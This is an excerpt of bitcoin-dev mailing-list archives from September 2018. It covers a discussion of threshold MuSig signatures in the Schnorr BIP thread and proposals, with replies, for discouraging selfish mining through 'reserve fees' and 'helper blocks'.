> > https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180912/c2479290/attachment-0001.html>

From apoelstra at wpsoftware.net  Thu Sep 13 18:46:50 2018
From: apoelstra at wpsoftware.net (Andrew Poelstra)
Date: Thu, 13 Sep 2018 18:46:50 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
References: <20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
	<CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
Message-ID: <20180913184649.GC18522@boulet.lan>

On Tue, Sep 11, 2018 at 01:37:59PM -0400, Erik Aronesty via bitcoin-dev wrote:
> - Musig, by being M of M, is inherently prone to loss.
>

It has always been possible to create M-of-N threshold MuSig signatures for any
M, N with 0 < M ? N. This is (a) obvious, (b) in our paper, (c) implemented at

https://github.com/apoelstra/secp256k1/blob/2018-04-taproot/src/modules/musig/main_impl.h 

-- 
Andrew Poelstra
Research Director, Mathematics Department, Blockstream
Email: apoelstra at wpsoftware.net
Web:   https://www.wpsoftware.net/andrew

"Make it stop, my love; we were wrong to try
 Never saw what we could unravel in traveling light
 Nor how the trip debrides like a stack of slides
 All we saw was that time is taller than space is wide"
       --Joanna Newsom

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 455 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180913/ca7797a6/attachment.sig>

From erik at q32.com  Thu Sep 13 20:20:36 2018
From: erik at q32.com (Erik Aronesty)
Date: Thu, 13 Sep 2018 16:20:36 -0400
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <20180913184649.GC18522@boulet.lan>
References: <20180812163734.GV499@boulet.lan>
	<CAJowKg+h11YkwOo-gyWCw+87Oh-9K34LOnJ1730hhpoVR2m5sA@mail.gmail.com>
	<20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
	<CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
	<20180913184649.GC18522@boulet.lan>
Message-ID: <CAJowKg+0uOZ5_ryFit6-GW_fEbkXwBU8m7VAAOxgZAzP_5rF8A@mail.gmail.com>

The paper refers to either:

  a) building up threshold signatures via concatenation, or. implicitly -
in Bitcoin -
  b) by indicating that of M of N are valid, and requiring a validator to
validate one of the permutations of M that signed - as opposed to a scheme,
like a polynomial function, where the threshold is built in to the system.

Maybe there's another mechanism in there that I'm not aware of - because
it's just too simple to mention?

- Erik






On Thu, Sep 13, 2018 at 2:46 PM Andrew Poelstra <apoelstra at wpsoftware.net>
wrote:

> On Tue, Sep 11, 2018 at 01:37:59PM -0400, Erik Aronesty via bitcoin-dev
> wrote:
> > - Musig, by being M of M, is inherently prone to loss.
> >
>
> It has always been possible to create M-of-N threshold MuSig signatures
> for any
> M, N with 0 < M ? N. This is (a) obvious, (b) in our paper, (c)
> implemented at
>
>
> https://github.com/apoelstra/secp256k1/blob/2018-04-taproot/src/modules/musig/main_impl.h
>
> --
> Andrew Poelstra
> Research Director, Mathematics Department, Blockstream
> Email: apoelstra at wpsoftware.net
> Web:   https://www.wpsoftware.net/andrew
>
> "Make it stop, my love; we were wrong to try
>  Never saw what we could unravel in traveling light
>  Nor how the trip debrides like a stack of slides
>  All we saw was that time is taller than space is wide"
>        --Joanna Newsom
>
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180913/88497b38/attachment.html>

From onelineproof at gmail.com  Thu Sep 13 23:19:37 2018
From: onelineproof at gmail.com (Andrew)
Date: Thu, 13 Sep 2018 23:19:37 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
Message-ID: <CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>

I discussed this more at bitcointalk:
https://bitcointalk.org/index.php?topic=4998410.0

The attacks I'm interested in preventing are not only selfish mining
and collusion, but also more subtle attacks like block withholding,
and in general anything that aims to drive out the competition in
order to increase hashrate fraction. I also scrapped the idea of
changing the block subsidies, and I am only focuses on fees.

You can read more about the motivation and details in the bitcointalk
thread, but my proposal in short would be to add the concept of
"reserve fees". When a user makes a transaction, for each txout
script, they can add parameters that specify the fraction of the total
fee that is held in "reserve" and the time it is held in "reserve"
(can set a limit of 2016 blocks). This "reserve" part of the fee will
be paid to miners if the hashrate rises. So if hashrate is currently h
and peak hashrate (from past year) is p, then for each period (1 day),
a new hashrate is calculated h1, and if h1 > h, then the fraction
(h1-h)/p from the reserve fees created in the past 2016 blocks will be
released to miners for that period (spread out over the 144 blocks in
that period). And this will keep happening as long as hashrate keeps
rising, until the "contract" expires, and the leftover part can be
used by the owner of the unspent output, but it can only be used for
paying fees, not as inputs for future transactions (to save on block
space).

This should incentivize miners to not drive out the competition, since
if they do, there will be less of these reserve fees given to miners.
Yes in the end the miners will get all the fees, but with rising
hashrate they get an unconditional subsidy that does not require
transactions, thus more space for transactions with fees.

I can make a formal BIP and pull request, but I need to know if there
is interest in this. Now fees don't play such a large part of the
block reward, but they will get more important, and this change
wouldn't force anything (would be voluntary by each user), just miners
have to agree to it with a soft fork (so they don't spend from the
anyone-can-spend outputs used for reserve fees). Resource requirements
for validation are quite small I believe.

On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
> As I understand, selfish mining is an attack where miners collude to
> mine at a lower hashrate then with all miners working independently.
> What are the current strategies used to prevent this and what are the
> future plans?
>
> One idea I have is to let the block reward get "modulated" according
> to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
> consisting of 144 blocks, h is the hashrate of the last 144 block (1
> day) period, and r is the base subsidy (12.5 BTC currently). You can
> then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> peak you get the full reward. Otherwise you get less, down to a min of
> 0.5 r.
>
> If miners were to collude to mine at a lower than peak hashrate, then
> they may be able to do it profitably for 144 blocks, but after that,
> the reward would get modulated and it wouldn't be so much in their
> interest to continue mining at the lower hashrate.
>
> What flaws are there with this? I know it could be controversial due
> to easier mining present for early miners, so maybe it would have to
> be done in combination with a new more dynamic difficulty adjustment
> algorithm. But I don't see how hashrate can continue rising
> indefinitely, so a solution should be made for selfish mining.
>
> Also when subsidies stop and a fee market is needed, I guess a portion
> of the fees can be withheld for later if hashrate is not at peak.
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647



-- 
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647

From ethan.scruples at gmail.com  Fri Sep 14 14:49:16 2018
From: ethan.scruples at gmail.com (Moral Agent)
Date: Fri, 14 Sep 2018 10:49:16 -0400
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
Message-ID: <CACiOHGzZ3VQVDsRdU6wsC+mqYJ6nTa4sm4snqDNTcR6x5XP2=Q@mail.gmail.com>

You might be interested in an idea I wrote about that is in a similar
spirit here:

https://medium.com/coinmonks/taming-large-miners-with-helper-blocks-6ae67ac242f6

>From the article:

When a block is solved, it randomly selects one satoshi from the utxo set
and gives whomever controls that satoshi the power to generate a ?Helper
Block?. The Helper Block commits to a subset of transactions for inclusion
in the next block. A miner can accept the Helper Block by including the
suggested transactions and giving the associated transaction fees to a
payment address specified in the Helper Block. Miners who do not use a
Helper Block must satisfy a 25% higher difficulty.

On Fri, Sep 14, 2018 at 9:56 AM Andrew via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> I discussed this more at bitcointalk:
> https://bitcointalk.org/index.php?topic=4998410.0
>
> The attacks I'm interested in preventing are not only selfish mining
> and collusion, but also more subtle attacks like block withholding,
> and in general anything that aims to drive out the competition in
> order to increase hashrate fraction. I also scrapped the idea of
> changing the block subsidies, and I am only focuses on fees.
>
> You can read more about the motivation and details in the bitcointalk
> thread, but my proposal in short would be to add the concept of
> "reserve fees". When a user makes a transaction, for each txout
> script, they can add parameters that specify the fraction of the total
> fee that is held in "reserve" and the time it is held in "reserve"
> (can set a limit of 2016 blocks). This "reserve" part of the fee will
> be paid to miners if the hashrate rises. So if hashrate is currently h
> and peak hashrate (from past year) is p, then for each period (1 day),
> a new hashrate is calculated h1, and if h1 > h, then the fraction
> (h1-h)/p from the reserve fees created in the past 2016 blocks will be
> released to miners for that period (spread out over the 144 blocks in
> that period). And this will keep happening as long as hashrate keeps
> rising, until the "contract" expires, and the leftover part can be
> used by the owner of the unspent output, but it can only be used for
> paying fees, not as inputs for future transactions (to save on block
> space).
>
> This should incentivize miners to not drive out the competition, since
> if they do, there will be less of these reserve fees given to miners.
> Yes in the end the miners will get all the fees, but with rising
> hashrate they get an unconditional subsidy that does not require
> transactions, thus more space for transactions with fees.
>
> I can make a formal BIP and pull request, but I need to know if there
> is interest in this. Now fees don't play such a large part of the
> block reward, but they will get more important, and this change
> wouldn't force anything (would be voluntary by each user), just miners
> have to agree to it with a soft fork (so they don't spend from the
> anyone-can-spend outputs used for reserve fees). Resource requirements
> for validation are quite small I believe.
>
> On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
> > As I understand, selfish mining is an attack where miners collude to
> > mine at a lower hashrate then with all miners working independently.
> > What are the current strategies used to prevent this and what are the
> > future plans?
> >
> > One idea I have is to let the block reward get "modulated" according
> > to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
> > consisting of 144 blocks, h is the hashrate of the last 144 block (1
> > day) period, and r is the base subsidy (12.5 BTC currently). You can
> > then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> > peak you get the full reward. Otherwise you get less, down to a min of
> > 0.5 r.
> >
> > If miners were to collude to mine at a lower than peak hashrate, then
> > they may be able to do it profitably for 144 blocks, but after that,
> > the reward would get modulated and it wouldn't be so much in their
> > interest to continue mining at the lower hashrate.
> >
> > What flaws are there with this? I know it could be controversial due
> > to easier mining present for early miners, so maybe it would have to
> > be done in combination with a new more dynamic difficulty adjustment
> > algorithm. But I don't see how hashrate can continue rising
> > indefinitely, so a solution should be made for selfish mining.
> >
> > Also when subsidies stop and a fee market is needed, I guess a portion
> > of the fees can be withheld for later if hashrate is not at peak.
> >
> >
> > --
> > PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180914/22e64f75/attachment-0001.html>

From apoelstra at wpsoftware.net  Fri Sep 14 14:38:02 2018
From: apoelstra at wpsoftware.net (Andrew Poelstra)
Date: Fri, 14 Sep 2018 14:38:02 +0000
Subject: [bitcoin-dev] Schnorr signatures BIP
In-Reply-To: <CAJowKg+0uOZ5_ryFit6-GW_fEbkXwBU8m7VAAOxgZAzP_5rF8A@mail.gmail.com>
References: <20180903000518.GB18522@boulet.lan>
	<CAJowKg+PDtEV3je_N9Ra6u3n4+ZQ3ozYapt8ivxGYYU28Qad+w@mail.gmail.com>
	<CAAS2fgT0uBGbLBOW4TxA-qCzOLwoQ1qSV-R0dMKRzPLAm_UOqQ@mail.gmail.com>
	<CAJowKg+-45h6vraL1PpnqfhHSbG+G40L+FD7xN+C-Dn1E6Y_Vg@mail.gmail.com>
	<CAAS2fgSfdfQ2CiEabjrjspQGQufwzk84f1mzM1j_LRWqAPd8wA@mail.gmail.com>
	<CAJowKgK3Pxev4pDH4xVLPvmHda8oAfq=fya4TY+_dodUJ7j9Nw@mail.gmail.com>
	<CAAS2fgQOb4UJBkH=pMre=tsbAUmMNYx=4jkBawX4Rc_dKcpwZg@mail.gmail.com>
	<CAJowKgK9UdavrGnKum43dx+DXe+LakHXuVU6bNhMFtEoy2U3Og@mail.gmail.com>
	<20180913184649.GC18522@boulet.lan>
	<CAJowKg+0uOZ5_ryFit6-GW_fEbkXwBU8m7VAAOxgZAzP_5rF8A@mail.gmail.com>
Message-ID: <20180914143802.GG18522@boulet.lan>

Hi Erik,


Sorry, you're right - I thought we mentioned m-of-n as a footnote but that was
actually in the earlier pre-MuSig version of our multisig paper.

Threshold signatures -are- mentioned in the BIP which started this thread, though.
At https://github.com/sipa/bips/blob/bip-schnorr/bip-schnorr.mediawiki we say

    "Further, by combining Schnorr signatures with Pedersen Secret Sharing,
     it is possible to obtain an interactive threshold signature scheme that
     ensures that signatures can only be produced by arbitrary but predetermined
     sets of signers. For example, k-of-n threshold signatures can be realized
     this way. Furthermore, it is possible to replace the combination of
     participant keys in this scheme with MuSig, though the security of that
     combination still needs analysis. 

and this combination of MuSig and VSS is exactly what is implemented in my code.



Cheers
Andrew



On Thu, Sep 13, 2018 at 04:20:36PM -0400, Erik Aronesty wrote:
> The paper refers to either:
> 
>   a) building up threshold signatures via concatenation, or. implicitly -
> in Bitcoin -
>   b) by indicating that of M of N are valid, and requiring a validator to
> validate one of the permutations of M that signed - as opposed to a scheme,
> like a polynomial function, where the threshold is built in to the system.
> 
> Maybe there's another mechanism in there that I'm not aware of - because
> it's just too simple to mention?
> 
> - Erik
> 
> 
> 
> 
> 
> 
> On Thu, Sep 13, 2018 at 2:46 PM Andrew Poelstra <apoelstra at wpsoftware.net>
> wrote:
> 
> > On Tue, Sep 11, 2018 at 01:37:59PM -0400, Erik Aronesty via bitcoin-dev
> > wrote:
> > > - Musig, by being M of M, is inherently prone to loss.
> > >
> >
> > It has always been possible to create M-of-N threshold MuSig signatures
> > for any
> > M, N with 0 < M ? N. This is (a) obvious, (b) in our paper, (c)
> > implemented at
> >
> >
> > https://github.com/apoelstra/secp256k1/blob/2018-04-taproot/src/modules/musig/main_impl.h
> >
> > --
> > Andrew Poelstra
> > Research Director, Mathematics Department, Blockstream
> > Email: apoelstra at wpsoftware.net
> > Web:   https://www.wpsoftware.net/andrew
> >
> > "Make it stop, my love; we were wrong to try
> >  Never saw what we could unravel in traveling light
> >  Nor how the trip debrides like a stack of slides
> >  All we saw was that time is taller than space is wide"
> >        --Joanna Newsom
> >
> >

-- 
Andrew Poelstra
Research Director, Mathematics Department, Blockstream
Email: apoelstra at wpsoftware.net
Web:   https://www.wpsoftware.net/andrew

"Make it stop, my love; we were wrong to try
 Never saw what we could unravel in traveling light
 Nor how the trip debrides like a stack of slides
 All we saw was that time is taller than space is wide"
       --Joanna Newsom

-------------- next part --------------
A non-text attachment was scrubbed...
Name: signature.asc
Type: application/pgp-signature
Size: 455 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180914/498c9bc5/attachment.sig>

From ethan.scruples at gmail.com  Fri Sep 14 18:00:29 2018
From: ethan.scruples at gmail.com (Moral Agent)
Date: Fri, 14 Sep 2018 14:00:29 -0400
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=kKwjbR4-rOn8K3-=myW5Nx6ugkyPWTTy9c+r0wrA6i0A@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<CACiOHGzZ3VQVDsRdU6wsC+mqYJ6nTa4sm4snqDNTcR6x5XP2=Q@mail.gmail.com>
	<CAL8tG=kKwjbR4-rOn8K3-=myW5Nx6ugkyPWTTy9c+r0wrA6i0A@mail.gmail.com>
Message-ID: <CACiOHGz7hFeGKLmUDvsEp-yjiiEfdCWBeKya0ZDVGCeO+1VgZg@mail.gmail.com>

Thank you, and my apologies. I should have sent that link just to you and
not put everyone on cc.

On Fri, Sep 14, 2018 at 1:30 PM Andrew <onelineproof at gmail.com> wrote:

> (reposting to whole list instead of just him) @Moral Agent:
> Interesting proposal though it introduces some elements
> of proof of stake so it would be more controversial in my view. Also,
> something needs to be explained about how this would not create an
> attack where difficulty is frequently dropping by 25%, and suddenly we
> find ourselves with a very low difficulty and PoW attacks can easily
> happen. I need to analyse your proposal more, but I prefer to discuss
> it on your blog instead of here just to limit the side topics and
> focus only on my proposal.
>
> No one has yet given me a good reason for why not to support my proposal...
>
> On Fri, Sep 14, 2018 at 2:49 PM, Moral Agent <ethan.scruples at gmail.com>
> wrote:
> > You might be interested in an idea I wrote about that is in a similar
> spirit
> > here:
> >
> >
> https://medium.com/coinmonks/taming-large-miners-with-helper-blocks-6ae67ac242f6
> >
> > From the article:
> >
> > When a block is solved, it randomly selects one satoshi from the utxo set
> > and gives whomever controls that satoshi the power to generate a ?Helper
> > Block?. The Helper Block commits to a subset of transactions for
> inclusion
> > in the next block. A miner can accept the Helper Block by including the
> > suggested transactions and giving the associated transaction fees to a
> > payment address specified in the Helper Block. Miners who do not use a
> > Helper Block must satisfy a 25% higher difficulty.
> >
> > On Fri, Sep 14, 2018 at 9:56 AM Andrew via bitcoin-dev
> > <bitcoin-dev at lists.linuxfoundation.org> wrote:
> >>
> >> I discussed this more at bitcointalk:
> >> https://bitcointalk.org/index.php?topic=4998410.0
> >>
> >> The attacks I'm interested in preventing are not only selfish mining
> >> and collusion, but also more subtle attacks like block withholding,
> >> and in general anything that aims to drive out the competition in
> >> order to increase hashrate fraction. I also scrapped the idea of
> >> changing the block subsidies, and I am only focuses on fees.
> >>
> >> You can read more about the motivation and details in the bitcointalk
> >> thread, but my proposal in short would be to add the concept of
> >> "reserve fees". When a user makes a transaction, for each txout
> >> script, they can add parameters that specify the fraction of the total
> >> fee that is held in "reserve" and the time it is held in "reserve"
> >> (can set a limit of 2016 blocks). This "reserve" part of the fee will
> >> be paid to miners if the hashrate rises. So if hashrate is currently h
> >> and peak hashrate (from past year) is p, then for each period (1 day),
> >> a new hashrate is calculated h1, and if h1 > h, then the fraction
> >> (h1-h)/p from the reserve fees created in the past 2016 blocks will be
> >> released to miners for that period (spread out over the 144 blocks in
> >> that period). And this will keep happening as long as hashrate keeps
> >> rising, until the "contract" expires, and the leftover part can be
> >> used by the owner of the unspent output, but it can only be used for
> >> paying fees, not as inputs for future transactions (to save on block
> >> space).
> >>
> >> This should incentivize miners to not drive out the competition, since
> >> if they do, there will be less of these reserve fees given to miners.
> >> Yes in the end the miners will get all the fees, but with rising
> >> hashrate they get an unconditional subsidy that does not require
> >> transactions, thus more space for transactions with fees.
> >>
> >> I can make a formal BIP and pull request, but I need to know if there
> >> is interest in this. Now fees don't play such a large part of the
> >> block reward, but they will get more important, and this change
> >> wouldn't force anything (would be voluntary by each user), just miners
> >> have to agree to it with a soft fork (so they don't spend from the
> >> anyone-can-spend outputs used for reserve fees). Resource requirements
> >> for validation are quite small I believe.
> >>
> >> On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
> >> > As I understand, selfish mining is an attack where miners collude to
> >> > mine at a lower hashrate then with all miners working independently.
> >> > What are the current strategies used to prevent this and what are the
> >> > future plans?
> >> >
> >> > One idea I have is to let the block reward get "modulated" according
> >> > to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
> >> > consisting of 144 blocks, h is the hashrate of the last 144 block (1
> >> > day) period, and r is the base subsidy (12.5 BTC currently). You can
> >> > then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
> >> > peak you get the full reward. Otherwise you get less, down to a min of
> >> > 0.5 r.
> >> >
> >> > If miners were to collude to mine at a lower than peak hashrate, then
> >> > they may be able to do it profitably for 144 blocks, but after that,
> >> > the reward would get modulated and it wouldn't be so much in their
> >> > interest to continue mining at the lower hashrate.
> >> >
> >> > What flaws are there with this? I know it could be controversial due
> >> > to easier mining present for early miners, so maybe it would have to
> >> > be done in combination with a new more dynamic difficulty adjustment
> >> > algorithm. But I don't see how hashrate can continue rising
> >> > indefinitely, so a solution should be made for selfish mining.
> >> >
> >> > Also when subsidies stop and a fee market is needed, I guess a portion
> >> > of the fees can be withheld for later if hashrate is not at peak.
> >> >
> >> >
> >> > --
> >> > PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> >>
> >>
> >>
> >> --
> >> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
> >> _______________________________________________
> >> bitcoin-dev mailing list
> >> bitcoin-dev at lists.linuxfoundation.org
> >> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
>
>
> --
> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180914/c57899e8/attachment.html>

From onelineproof at gmail.com  Fri Sep 14 17:30:02 2018
From: onelineproof at gmail.com (Andrew)
Date: Fri, 14 Sep 2018 17:30:02 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CACiOHGzZ3VQVDsRdU6wsC+mqYJ6nTa4sm4snqDNTcR6x5XP2=Q@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
	<CACiOHGzZ3VQVDsRdU6wsC+mqYJ6nTa4sm4snqDNTcR6x5XP2=Q@mail.gmail.com>
Message-ID: <CAL8tG=kKwjbR4-rOn8K3-=myW5Nx6ugkyPWTTy9c+r0wrA6i0A@mail.gmail.com>

(reposting to whole list instead of just him) @Moral Agent:
Interesting proposal though it introduces some elements
of proof of stake so it would be more controversial in my view. Also,
something needs to be explained about how this would not create an
attack where difficulty is frequently dropping by 25%, and suddenly we
find ourselves with a very low difficulty and PoW attacks can easily
happen. I need to analyse your proposal more, but I prefer to discuss
it on your blog instead of here just to limit the side topics and
focus only on my proposal.

No one has yet given me a good reason for why not to support my proposal...

On Fri, Sep 14, 2018 at 2:49 PM, Moral Agent <ethan.scruples at gmail.com> wrote:
> You might be interested in an idea I wrote about that is in a similar spirit
> here:
>
> https://medium.com/coinmonks/taming-large-miners-with-helper-blocks-6ae67ac242f6
>
> From the article:
>
> When a block is solved, it randomly selects one satoshi from the utxo set
> and gives whomever controls that satoshi the power to generate a ?Helper
> Block?. The Helper Block commits to a subset of transactions for inclusion
> in the next block. A miner can accept the Helper Block by including the
> suggested transactions and giving the associated transaction fees to a
> payment address specified in the Helper Block. Miners who do not use a
> Helper Block must satisfy a 25% higher difficulty.
>
> On Fri, Sep 14, 2018 at 9:56 AM Andrew via bitcoin-dev
> <bitcoin-dev at lists.linuxfoundation.org> wrote:
>>
>> I discussed this more at bitcointalk:
>> https://bitcointalk.org/index.php?topic=4998410.0
>>
>> The attacks I'm interested in preventing are not only selfish mining
>> and collusion, but also more subtle attacks like block withholding,
>> and in general anything that aims to drive out the competition in
>> order to increase hashrate fraction. I also scrapped the idea of
>> changing the block subsidies, and I am only focuses on fees.
>>
>> You can read more about the motivation and details in the bitcointalk
>> thread, but my proposal in short would be to add the concept of
>> "reserve fees". When a user makes a transaction, for each txout
>> script, they can add parameters that specify the fraction of the total
>> fee that is held in "reserve" and the time it is held in "reserve"
>> (can set a limit of 2016 blocks). This "reserve" part of the fee will
>> be paid to miners if the hashrate rises. So if hashrate is currently h
>> and peak hashrate (from past year) is p, then for each period (1 day),
>> a new hashrate is calculated h1, and if h1 > h, then the fraction
>> (h1-h)/p from the reserve fees created in the past 2016 blocks will be
>> released to miners for that period (spread out over the 144 blocks in
>> that period). And this will keep happening as long as hashrate keeps
>> rising, until the "contract" expires, and the leftover part can be
>> used by the owner of the unspent output, but it can only be used for
>> paying fees, not as inputs for future transactions (to save on block
>> space).
>>
>> This should incentivize miners to not drive out the competition, since
>> if they do, there will be less of these reserve fees given to miners.
>> Yes in the end the miners will get all the fees, but with rising
>> hashrate they get an unconditional subsidy that does not require
>> transactions, thus more space for transactions with fees.
>>
>> I can make a formal BIP and pull request, but I need to know if there
>> is interest in this. Now fees don't play such a large part of the
>> block reward, but they will get more important, and this change
>> wouldn't force anything (would be voluntary by each user), just miners
>> have to agree to it with a soft fork (so they don't spend from the
>> anyone-can-spend outputs used for reserve fees). Resource requirements
>> for validation are quite small I believe.
>>
>> On Sat, Sep 1, 2018 at 12:11 AM, Andrew <onelineproof at gmail.com> wrote:
>> > As I understand, selfish mining is an attack where miners collude to
>> > mine at a lower hashrate then with all miners working independently.
>> > What are the current strategies used to prevent this and what are the
>> > future plans?
>> >
>> > One idea I have is to let the block reward get "modulated" according
>> > to peak hashrate. Say p is the peak hashrate for 365 periods (1 year)
>> > consisting of 144 blocks, h is the hashrate of the last 144 block (1
>> > day) period, and r is the base subsidy (12.5 BTC currently). You can
>> > then make the max block reward 0.5 r (1 + h/p). So if hashrate is at
>> > peak you get the full reward. Otherwise you get less, down to a min of
>> > 0.5 r.
>> >
>> > If miners were to collude to mine at a lower than peak hashrate, then
>> > they may be able to do it profitably for 144 blocks, but after that,
>> > the reward would get modulated and it wouldn't be so much in their
>> > interest to continue mining at the lower hashrate.
>> >
>> > What flaws are there with this? I know it could be controversial due
>> > to easier mining present for early miners, so maybe it would have to
>> > be done in combination with a new more dynamic difficulty adjustment
>> > algorithm. But I don't see how hashrate can continue rising
>> > indefinitely, so a solution should be made for selfish mining.
>> >
>> > Also when subsidies stop and a fee market is needed, I guess a portion
>> > of the fees can be withheld for later if hashrate is not at peak.
>> >
>> >
>> > --
>> > PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>>
>>
>>
>> --
>> PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647
>> _______________________________________________
>> bitcoin-dev mailing list
>> bitcoin-dev at lists.linuxfoundation.org
>> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev



-- 
PGP: B6AC 822C 451D 6304 6A28  49E9 7DB7 011C D53B 5647

From willtech at live.com.au  Sat Sep 15 05:29:20 2018
From: willtech at live.com.au (Damian Williamson)
Date: Sat, 15 Sep 2018 05:29:20 +0000
Subject: [bitcoin-dev] Selfish Mining Prevention
In-Reply-To: <CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
References: <CAL8tG=k+kXHMbQdUXO3BXKv7fQwp5t2QuaQut7sPUtEYgwzn0A@mail.gmail.com>,
	<CAL8tG=mui_izrob0V66QqNzSJs1Lpbm0xxUYMpzb65-JR9QhRw@mail.gmail.com>
Message-ID: <PS2P216MB017942E0336DD337CB1EB6A89D180@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>

>This "reserve" part of the fee will be paid to miners if the hashrate rises.


Anticipating ongoing hashrate rise shows that you have not yet thought about moving outside of the current greed model, a model wherein mining will consume all available resources within the colony's objective just to spread as far as possible with each new miner bringing diminishing individual returns and shortening the life of Earth for no additional gain. Greed model := bacteria.

________________________________
